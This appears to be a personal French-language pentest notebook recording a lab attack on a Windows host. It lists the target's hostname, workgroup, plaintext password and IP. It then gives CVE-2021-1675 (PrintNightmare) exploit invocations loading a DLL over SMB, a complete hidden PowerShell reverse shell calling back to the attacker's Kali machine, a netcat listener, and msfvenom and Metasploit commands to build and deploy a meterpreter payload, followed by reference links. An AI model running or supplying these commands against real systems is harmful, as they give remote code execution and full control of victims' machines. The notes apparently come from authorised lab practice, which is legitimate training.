domain hostname
DESKTOP-FQRFI1I

domaine 
WORKGROUP


motde passe
Motdepassepentest936


192.168.0.14





./CVE-2021-1675.py WORKGROUP/vmpen:Motdepassepentest936@192.168.0.14 '\\192.168.0p.111\smb\addCube.dll'
./CVE-2021-1675.py WORKGROUP/vmpen:Motdepassepentest936@192.168.0.14 'C:\addCube.dll



## mise en place du reverse shell 
https://www.revshells.com/


-> ip de kali
port 9010
- pc kali
`nc -vv -l -p 9010`
- Pc windows :
ouvrir cmd
`powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("192.168.0.111",9006);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

- pc kali

```powershell
ls
pwd
dir
systeminfo
```
## mise
- kali

```bash
msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.0.111 LPORT=8080 -f exe -o http_8080.exe


msfconsole

use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_http
set LPORT 8080
set LHOST 192.168.0.111
exploit
```

- pc windows
donwload fichier
http://192.168.0.111:8080

dl fichier exe
lancer fichier exe
- pc kali
exploit
sysinfo
pwd


## links
https://www.geeksforgeeks.org/how-to-create-reverse-shells-with-netcat-in-kali-linux/


https://www.revshells.com/


https://www.bing.com/search?q=zaid+zsecurity+windows+11&cvid=c414b62fafdd4c5c89ba8f40dc540476&aqs=edge.0.69i59j69i57j0l5.9714j0j1&pglt=643&FORM=ANNAB1&DAF0=1&PC=U531


https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3


https://www.bing.com/search?q=smb+1.0+metasploit&cvid=998e07e76aaf4be982dd7dfdafef8d7d&aqs=edge.1.69i57j69i59l3j0j69i60l2.2541j0j1&pglt=643&FORM=ANNAB1&DAF0=1&PC=U531


https://www.hackingarticles.in/penetration-testing-in-smb-protocol-using-metasploit/


https://www.bing.com/search?q=how+to+enable+smb2.0&cvid=8402ddd41b3142e0a5ff277aad57a52f&aqs=edge..69i57j0l6.3184j0j4&pglt=675&FORM=ANAB01&DAF0=1&PC=U531

https://www.bing.com/search?q=how+to+enable+smb2.0&cvid=8402ddd41b3142e0a5ff277aad57a52f&aqs=edge..69i57j0l6.3184j0j4&pglt=675&FORM=ANAB01&DAF0=1&PC=U531


https://askubuntu.com/questions/79078/how-to-restart-samba-server


https://www.windows-commandline.com/find-domain-name-command-line/#:~:text=We%20can%20find%20the%20domain%20name%20of%20a,variable%20%E2%80%98USERDOMAIN%E2%80%99.%20Command%20for%20this%20is%20given%20below.


https://www.bing.com/search?q=smb+port+windows+10&cvid=2ca57b4b857a4bdb89fd17155b8075b9&aqs=edge.0.0j69i57.2863j0j1&pglt=643&FORM=ANNAB1&DAF0=1&PC=U531


https://www.bing.com/search?q=NET+USET+TEST+PASSWORD&qs=n&form=QBRE&sp=-1&pq=net+uset+test+passwor&sc=0-21&sk=&cvid=EF865E19CED94922AB6F24D68C238122



https://www.bing.com/search?q=NET+USET+TEST+PASSWORD&qs=n&form=QBRE&sp=-1&pq=net+uset+test+passwor&sc=0-21&sk=&cvid=EF865E19CED94922AB6F24D68C238122


https://www.bing.com/search?q=samba+service+restart&qs=UT&pq=samba+service+rest&sc=1-18&cvid=1B12C21EB51643BDBD1734ECF7C0C291&FORM=QBRE&sp=1



https://www.bing.com/search?q=domain+cmd&qs=n&form=QBRE&sp=-1&ghc=1&pq=domain&sc=6-6&sk=&cvid=0E7A6CF56073493196440C2A51FD9F23



https://github.com/search?l=Shell&q=CVE-2021-1675&type=Repositories


https://www.bing.com/search?q=smb+1.0+metasploit&qs=n&form=QBRE&sp=-1&ghc=1&pq=smb+1.0+metasplo&sc=0-16&sk=&cvid=5480E99F45864211A896B3C7915EBDF4



https://www.hackingarticles.in/penetration-testing-in-smb-protocol-using-metasploit/


https://github.com/cube0x0/CVE-2021-1675